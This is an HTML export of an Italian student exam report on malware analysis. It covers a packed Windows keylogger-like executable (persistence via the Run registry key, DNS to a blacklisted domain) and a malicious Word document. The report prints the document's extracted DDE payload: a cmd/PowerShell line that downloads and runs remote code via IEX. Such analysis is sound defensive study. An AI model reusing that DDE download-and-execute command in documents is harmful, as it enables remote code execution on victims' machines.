@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>README.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="codice-malevolo-report">codice-malevolo-report</h1>
+<p>Progetto d'esame per Codice Malevolo AA 2022/2023 - Matricola VR457811</p>
+<h1 id="malware">Malware</h1>
+<h2 id="analisi-statica-di-base">Analisi statica di base</h2>
+<h3 id="informazioni-generali-ed-impacchettamento">Informazioni generali ed impacchettamento</h3>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/remnux-file.png" alt="Remnux file comand"></a></p>
+<pre class="hljs"><code><div>remnux@remnux:~/Desktop$ file '/home/remnux/Desktop/malware/malware' 
+/home/remnux/Desktop/malware/malware: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed
+</div></code></pre>
+<p>Vediamo innanzitutto che si tratta di un eseguibile per Windows a 32 bit dotato di interfaccia grafica e impacchettato con UPX.
+Possiamo vedere l'impacchettamento tramite UPX anche aprendo il file con pestudio e verificando il campo signature.</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/prima-apertura-pestudio.png" alt="Prima apertura con pestudio"></a></p>
+<p>Se vogliamo un'ulteriore conferma la possiamo trovare guardando il nome delle sezioni dell'eseguibile ed osservando nomi come UPX0 e UPX1:</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/pestudio-sections.png" alt="sezioni file in pestudio"></a></p>
+<p>Spacchettiamo ora l'eseguibile utilizzando UPX e apriamo la versione spacchettata utilizzando nuovamente pestudio:</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/seconda-apertura-pestudio.png" alt="Seconda apertura con pestudio"></a></p>
+<p>Vediamo che il campo signature è ora vuoto. La data di compilazione sembra essere domenica 15 aprile 2012. Utilizzando il programma ExeInfo PE riusciamo a vedere che la signature riporta [TODO: inserire firma]</p>
+<p>Nella lista delle sezioni troviamo la sezione tls, la sua presenza potrebbe indicare che il malware ha incluso un controllo di anti-debug, questa cosa merita controlli approfonditi che faremo in seguito. E' presente anche una sezione risorse.</p>
+<h3 id="risorse">Risorse</h3>
+<p>Tra le risorse troviamo alcuni file Delphi.</p>
+<h3 id="imports">Imports</h3>
+<p>Quello che possiamo vedere prima di tutto è che il malware include diversi import di API di Windows che gli consentono di gestire connessioni di rete, recuperare alcune informazioni sull'hardware della macchina infetta, prendere informazioni sui monitor e sulla finestra correntemente visualizzata (e cambiarla), modificare le chiavi del registro di windows, creare/distruggere processi, leggere e scrivere la clipboard.
+Un import da notare è GetCapture, funzione che consente di catturare una porzione dello/gli schermo/i, questo è un indicatore del fatto che il malware potrebbe catturare degli screenshot ed inviarli ad un attaccante. Contiene anche una serie di API legate alla gestione delle risorse e questo può essere legato al fatto che nelle risorse abbiamo dei file Delphi. Non mancano API per la lettura e scrittura di chiavi del registro di Windows, così come GetTickCount che può risultare utile per tecniche di antidebugging visto che consente di accorgersi se l'esecuzione è step-by-step anziché &quot;in tempo reale&quot;. Un'altra API utile al malware per proteggersi è Sleep che aiuta ad evadere il rilevamento da parte dell'antivirus.
+Ci sono anche API utili per le connessioni di rete e per l'allocazione della memoria, per la cattura dello stato della tastiera (il che può essere utile per un keylogger ad esempio) e possibilità di aggiungere, rimuovere e ricercare stringhe nella Atom Table (per salvare l'elenco di tasti premuti?), per la gestione di file su disco (ricerca, eliminazione, eccetera).</p>
+<p>[TODO: cercare le API qui riportate https://moodledidattica.univr.it/pluginfile.php/1231027/course/section/114897/reverse-engineering-malicious-code-tips.pdf]</p>
+<hr>
+<h3 id="stringhe">Stringhe</h3>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/pestudio-strings.png" alt="Stringhe in pestudio"></a></p>
+<p>Oltre alle stringhe legate alle API di cui abbiamo appena parlato troviamo una lunga lista di stringhe che pestudio ci segnala come potenziali indicatori di un comportamento malevolo. Tra le stringhe ci sono chiavi di registro ma anche diversi riferimenti a &quot;Shell traywnd&quot; ovvero alla barra di windows, al processo Task Manager, al Prompt dei comandi, a Internet Explorer e ad altre applicazioni.
+Il malware contiene anche un lungo elenco di tasti della tastiera (ad esempio Left, Right, Shift, [ESC], [F1]...[F8], [DEL], [INS]) che ci può far pensare ad una tastiera virtuale o più probabilmente ad una funzionalità di keylogging, soprattutto quest'ultimo considerando che contiene anche OnKeyDown, OnKeyPressed, OnKeyUp.
+Un'altra cosa degna di interesse è la presenza di diverse format-strings che fanno pensare ad un codice in C/C++ o Delphi, un ulteriore indizio di ciò è la presenza tra le stringhe di tipi di variabili quali Boolean, Integer, Byte, Word.
+E' poi presente una lunga lista di DLL quali kernel32, USER32, uxtheme, DWMAPI.
+Compare anche un elenco di tutti i caratteri per la codifica Base64 e ci sono molte stringhe che sembrano pezzi di stringhe codificate.
+Tra le stringhe vediamo anche una lista di registri di sistema (o pezzi di essi) tra i quali SOFTWARE\Microsoft\Windows\CurrentVersion\Run che può essere usato per l'avvio automatico al boot di qualche risorsa creata dal malware o del malware stesso.
+L'unico indirizzo IP che compare tra le stringhe sembra essere 127.0.0.1, quindi localhost, e non sono stati notati percorsi a file se non quelli ad applicazioni di Windows citati prima.
+Non è presente tra le stringhe alcun URL completo ma compaiono sia &quot;http://&quot; che &quot;www.&quot;, indicatori che degli url vengono costruiti ed utilizzati durante il funzionamento.</p>
+<h3 id="conclusioni-dellanalisi-statica">Conclusioni dell'analisi statica</h3>
+<p>Il malware potrebbe essere un keylogger capace di impostarsi in avvio automatico, creare copie di sé stesso, eseguire screenshots e mandare il tutto ad un endpoint.</p>
+<h2 id="analisi-dinamica-di-base">Analisi dinamica di base</h2>
+<p>Eseguamo ora il malware dopo aver fatto un'istantanea dei registri di Windows con RegShot ed avviando Process Monitor.</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/procmon.png" alt="ProcMon example"></a></p>
+<h3 id="persistenza-mitre-attck-matrix">Persistenza (Mitre ATT&amp;CK Matrix)</h3>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/persistenza.png" alt="Persistenza raggiunta"></a></p>
+<p>Come vediamo dallo screenshot qui sopra riportato la persistenza viene raggiunta dal malware creando una copia di sé chiamata <em>Taskmgrk.exe</em> al percorso <em>C:\Users\admin\AppData\Local\Temp\Temp</em> ed aggiungendola al registro di Windows tra le applicazioni da avviare automaticamente all'avvio, fingendosi quindi il task manager di Windows per qualcuno che naviga nel file system o nel registro. Infine il malware avvia questa nuova copia di sé, lo vediamo nella penultima riga dello screenshot in cui vi è l'operazione di <em>Process Create</em>.</p>
+<h3 id="registro-di-windows">Registro di Windows</h3>
+<p>Durante l'analisi statica sono state viste le seguenti chiavi di registro:</p>
+<p>Chiavi di registro in strings:</p>
+<ul>
+<li>SOFTWARE\Borland\Delphi\RTL</li>
+<li>Software\Borland\Locales</li>
+<li>Software\Borland\Delphi\Locales</li>
+<li>SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontSubstitutes</li>
+<li>SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg</li>
+<li>SOFTWARE\Microsoft\Shared Tools\MSConfig\startupfolder</li>
+<li>Software\Microsoft\Windows NT\CurrentVersion\Winlogon</li>
+<li>HARDWARE\DESCRIPTION\System\CentralProcessor\0</li>
+<li>SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
+</ul>
+<p>Sono stati trovati anche dei frammenti di chiavi di registro:</p>
+<ul>
+<li>HKLM</li>
+<li>HKCU</li>
+<li>CurrentVersion</li>
+<li>System\CurrentControlSet\Services\</li>
+</ul>
+<p>Esseguendo l'analisi dinamica con <em>Process Monitor</em> si è visto che in realtà il malware accede ad una quantità immensa di registri, possiamo vederne una piccola parte nel seguente screenshot:</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/procmon-regopenkey.png" alt="RegOpenKey"></a></p>
+<p>La lista delle chiavi create è per fortuna molto più breve:</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/procmon-regcreatekey.png" alt="RegCreateKey"></a></p>
+<p>Nessuna chiave esistente è invece stata rinominata.</p>
+<h3 id="registro-di-windows---privilege-escalation-mitre-attck-matrix">Registro di Windows - Privilege escalation (Mitre ATT&amp;CK Matrix)</h3>
+<p>Una chiave che compare nell'elenco e che può destare preoccupazioni è <em>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</em> con tipo di accesso <em>All access</em>: il malware può quindi modificare le procedure di login/logout dal sistema.</p>
+<h3 id="registro-di-windows---discovery-mitre-attck-matrix">Registro di Windows - Discovery (Mitre ATT&amp;CK Matrix)</h3>
+<p>Un'altra operazione fatta riguarda
+<em>HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\INTERNET SETTINGS\ZONES\1</em> (e 2, 3, 4, 0), significa che il malware accede alle impostazioni internet.
+Vengono cercate anche le chiavi <em>HKLM\SOFTWARE\MICROSOFT\CRYPTOGRAPHY\CONFIGURATION</em> e <em>HKLM\SYSTEM\CONTROLSET001\CONTROL\COMPUTERNAME\ACTIVECOMPUTERNAME</em> per leggere il guid ed il nome della macchina infettata.
+L'ultima chiave del registro da notare è _
+HKLM\System\CurrentControlSet\Control\NLS\Language_ per controllare la lingua del sistema.
+Accedendo a HKLM\System e a HKLM\Sam [TODO: da controllare] potrebbe anche effettuare il dump delle credenziali dell'utente.</p>
+<h3 id="creazione-processi">Creazione processi</h3>
+<p>Il malware non avvia processi oltre a quello visto per la persistenza.</p>
+<h3 id="creazione-file">Creazione file</h3>
+<p>Il malware non scrive files oltre a quello visto per la persistenza.</p>
+<h2 id="analisi-del-traffico-di-rete">Analisi del traffico di rete</h2>
+<p>E' stato catturato molto traffico di rete dalla macchina in esame. Filtrando per cercare le chiamate ai DNS troviamo un url ventoclima.hopto.org che potrebbe essere sospetto e cercando a fondo si scopre che è riportato in diverse blacklist, ad esempio su https://github.com/stamparm/blackbook . Questo indirizzo è stato cercato ogni pochi secondi per tutta la durata dell'esecuzione del malware.</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/wireshark-dns.png" alt="DNS"></a></p>
+<p>Non vengono effettuate connessioni di tipo SMTP.</p>
+<p>[TODO: ricontrollare la configurazione di inetsim e verificare se è corretto che non effettui altre richieste]</p>
+<h2 id="reverse-engineering-della-funzione-sub4835dc">Reverse engineering della funzione sub_4835DC</h2>
+<p>[TODO]</p>
+<h1 id="il-documento-malevolo">IL DOCUMENTO MALEVOLO</h1>
+<h1 id="verifica-del-formato-del-file">Verifica del formato del file</h1>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-file.png" alt="Verifica del formato"></a></p>
+<h2 id="analisi-statica">Analisi statica</h2>
+<h3 id="stringhe">Stringhe</h3>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-strings.png" alt="strings"></a></p>
+<p>Tra le stringhe non troviamo informazioni particolarmente interessanti, in chiaro troviamo solo i nomi e percorsi dei vari file contenuti del docx, gli stessi che vedremo quando elencheremo il contenuto del pacchetto, oltre ad una lunga lista di stringhe incomprensibili.</p>
+<h3 id="exiftool">exiftool</h3>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-exiftool.png" alt="exiftool"></a></p>
+<p>Una prima cosa da notare è che il file è stato realizzato partendo dal template Normal.dotm, tale estensione ci fa pensare che il file contenga una macro. Il nostro file è però effettivamente un docx e non un dotm.
+Il creatore del file è un anonimo &quot;Windows User&quot;.
+Vediamo anche che il file è stato creato (o modificato) nel settembre 2018 ed abbiamo conferma del fatto che si tratta realmente di un docx. La data di modifica dello Zip, invece, non va presa in considerazione in quanto la mezzanotte del primo gennaio 1980 è sicuramente l'interpretazione come data di un dato assente.
+Non abbiamo alcuna indicazione relativa alla localizzazione.</p>
+<h3 id="ricerca-di-codice-vba">Ricerca di codice VBA</h3>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-zipdump.png" alt="zipdump"></a>
+<a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-tree.png" alt="tree"></a>
+<a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-olevba.png" alt="olevba"></a>
+Come possiamo vedere con i comandi zipdump, tree (dopo la scompattazione) e olevba il docx in esame non contiene macro.</p>
+<h3 id="altro---dynamic-data-exchange">Altro - Dynamic Data Exchange</h3>
+<p>Si potrebbe pensare che il documento non sia quindi malevolo, ma contiene invece un pericolo di tipo diverso. Esiste una vecchia tecnologia Microsoft che consente di eseguire del codice direttamente dall'interno di un documento Office, chiamata Dynamic Data Exchange (DDE). DDE è documentato in MITRE ATT&amp;CK® T1559 ed è un protocollo nato per lo scambio di dati tra applicazioni del pacchetto Microsoft Office. Con le versioni più recenti di Office l'esecuzione di comandi DDE avviene solo dopo una richiesta di conferma all'utente, attenuando il problema legato alla sicurezza, tuttavia l'attaccante può spingere l'utente ad ignorare i messaggi di avviso e lasciare che venga eseguito il codice.</p>
+<p>Procediamo quindi a verificare l'eventuale presenza di comandi DDE con un apposito comando preinstallato in REMnux: msodde.</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-msodde.png" alt="msodde"></a></p>
+<p>Vediamo così un comando che effettua il download di un software malevolo. L'url <em>trt.doe.louisiana.gov</em> non è purtroppo più raggiungibile e non possiamo quindi analizzare il malware che era previsto dover essere scaricato ed eseguito sulla macchina.</p>
+<p>Il codice del comando è il seguente:</p>
+<pre class="hljs"><code><div>command: DDEAUTO c:\\windows\\system32\\cmd.exe \/k powershell -C ;echo \\https://sec.gov/\\;IEX((new-object net.webclient).downloadstring(https://trt.doe.louisiana.gov/fonts.txt)) \
+</div></code></pre>
+<p>Troviamo quindi due url:</p>
+<ul>
+<li>https://sec.gov/</li>
+<li>https://trt.doe.louisiana.gov/fonts.txt</li>
+</ul>
+<p>Il primo viene solo stampato, il secondo come detto è relativo al download.</p>
+<h2 id="altri-potenziali-pericoli">Altri potenziali pericoli</h2>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-oleid.png" alt="oleid"></a></p>
+<p>Come vediamo da questa tabella riassuntiva di oleid non sembrano presenti altri pericoli, in particolare oltre all'assenza di macro vediamo che non vengono rilevati template injection. E' superfluo l'utilizzo di oleobj, a questo punto, ma possiamo provarlo comunque per averne la prova:</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-oleobj.png" alt="oleobj"></a></p>
+<p>Per concludere possiamo aprire il documento in una macchina virtuale per vedere come appare all'utente protagonista dell'attacco:</p>
+<p><a href=""><img src="file:///Users/adminccc/Documents/GitHub/codice-malevolo-report/Screenshots/docx-screenshot.png" alt="screenshot"></a></p>
+<p>================================================</p>
+<h1 id="richieste-per-lesame-sezione-da-eliminare">Richieste per l'esame (sezione da eliminare)</h1>
+<p>================================================</p>
+<h1 id="malware">MALWARE</h1>
+<h2 id="ok-analisi-statica-di-base">OK Analisi statica di base</h2>
+<p>In questa sezione dovete riportare i risultati dell’analisi statica del PE del malware utilizzando tool quali PEstudio, ExeInfoPE or PEID. In particolare dovete rispondere alle seguenti domande:</p>
+<ul>
+<li>OK Il malware e’ impacchettato? Se si quale packer e’ stato utilizzato? Quali  sono gli elementi del PE file che indicano che il malware e’ impacchettato?</li>
+<li>OK Quali API vengono importate dal malware? Qual’e’ un possibile comportamento del malware in base alle API importate?</li>
+<li>OK Quali stringhe sono contenute nel malware? Ci sono stringhe che possono che corrispondono a file o cartelle? Oppure sottochiavi del Windows registry? Oppure  URL? oppure indirizzi IP?</li>
+<li>OK? Alcune delle stringhe sono offuscate o cifrate? Quale codifica o algoritmo di cifratura viene utilizzato?</li>
+</ul>
+<h2 id="ok-analisi-dinamica-di-base">OK Analisi dinamica di base</h2>
+<p>In questa sezione dovete riportare i risultati dell’analisi dinamica del malware utilizzando tools quali  Regshot, e ProcMon. In particolare dovete rispondere alle seguenti domande:</p>
+<ul>
+<li>OK Il malware crea o modifica chiavi o sottochiavi del Windows registry? Se si quali ?</li>
+<li>OK Il malware crea o cancella cartelle o file sulla macchina virtuale? Se si quali?</li>
+<li>OK Il malware crea qualche altro processo?</li>
+<li>OK Il malware e’ persistente sulla macchina virtuale? Se si, quale tecnica utilizza per raggiungere persistenza?</li>
+</ul>
+<h2 id="ok-analisi-del-traffico-di-rete">~OK Analisi del traffico di rete</h2>
+<p>In questa sezione dovete riportare i risultati dell’analisi del traffico di rete con Wireshark e Inetsim. In particolare, dovete rispondere alle seguenti domande:
+OK - Il malware inizia connessioni di rete? Se si che tipo di traffico genera?  Quali URL or indirizzi IP tenta di contattare?</p>
+<h2 id="reverse-engineering-della-funzione-indicata">Reverse engineering della funzione indicata</h2>
+<p>In questa sezione dovete spiegare il comportamento della funzione assegnata determinato facendo il reverse engineering del codice con IDA, Ghidra e x32dbg.</p>
+<h1 id="ok-il-documento-malevolo">~OK IL DOCUMENTO MALEVOLO</h1>
+<h2 id="ok-analisi-statica">~OK Analisi statica</h2>
+<p>In questa sezione dovete spiegare i risultati dell’analisi effettuata con strings (OK) , exiftool (OK), e yara (MANCA, fatto con msodde) Poi presentare i risultati ottenuti con i tool di analisi specifici per la tipologia di documento. Per esempio, se il documento è un pdf riportare i risultati ottenuti con pdfid, pdf-parser e peepdf.</p>
+<h2 id="ok-analisi-del-codice-malevolo-contenuto-nel-documento">OK Analisi del codice malevolo contenuto nel documento</h2>
+<p>In questa sezione dovete spiegare il comportamento dell’eventuale codice malevolo contenuto all’interno del documento.</p>
+<style>
+@media print, (overflow-block: paged) or (overflow-block: optional-paged)
+{
+  hr
+  {
+    page-break-after: always; /* CSS 2 */
+         break-after: region; /* CSS 3+ */
+    /* minimal layout disruption: */
+    height: 0.1mm; visibility: hidden;
+  }
+}
+</style>
+</body>
+</html>
